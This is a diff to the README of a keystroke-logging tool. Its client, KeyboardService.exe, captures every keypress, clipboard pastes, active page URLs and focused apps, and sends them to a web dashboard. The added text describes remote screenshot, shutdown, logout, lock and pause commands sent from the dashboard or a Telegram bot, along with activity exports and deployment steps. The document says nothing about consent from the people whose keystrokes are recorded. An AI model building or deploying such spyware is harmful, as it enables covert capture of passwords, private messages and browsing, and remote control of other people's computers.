@@ -12,6 +12,13 @@ Keyboard input -> KeyboardService.exe -> POST /api/messages -> app.py -> index.h
 
 Each message contains filtered `text`, the original `raw_text`, `device_id`, `device_name`, and `is_pasted`. When typing in a supported browser, the client also captures the exact active page URL as `source_url`; the filtered feed shows that URL with a link-copy button. Every keyboard press is also stored as a `raw_only` log record, including modifiers and non-text keys. The desktop client also records the active app and focused Windows control, keeping that destination while typing and starting a new message when focus moves to another field or app. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color. The web feed can switch between filtered bubbles and a separate raw keyboard log, and each device is a link to its own message feed.
 
+The dashboard includes per-device controls and an Activity view with device
+telemetry, command history, application and website summaries, and CSV/JSON
+message exports. Client controls include shutdown, logout, restart, lock,
+pause, resume, and screenshot requests. Telegram supports `/device`,
+`/controls`, `/screenshot`, `/shutdown`, `/logout`, `/restart`, `/lock`,
+`/pause`, and `/resume`.
+
 ## Files
 
 - `app.py`: FastAPI web server and message API.
@@ -52,6 +59,12 @@ Type a message and press Enter. It should appear in the browser.
    - Build: `pip install -r requirements.txt`
    - Start: `gunicorn -k uvicorn.workers.UvicornWorker app:app --bind 0.0.0.0:$PORT`
 4. Open the Render service URL in a browser.
+
+After deploying the control and activity features, run `migrations/000_all.sql`
+again so the `device_commands` and `audit_events` tables exist. Rebuild and
+reinstall the desktop client from the updated `client.py`; older clients keep
+the original controls but cannot acknowledge commands or use pause, resume,
+restart, and lock.
 
 Make sure the deployed service contains the latest `app.py` and `index.html`.
 
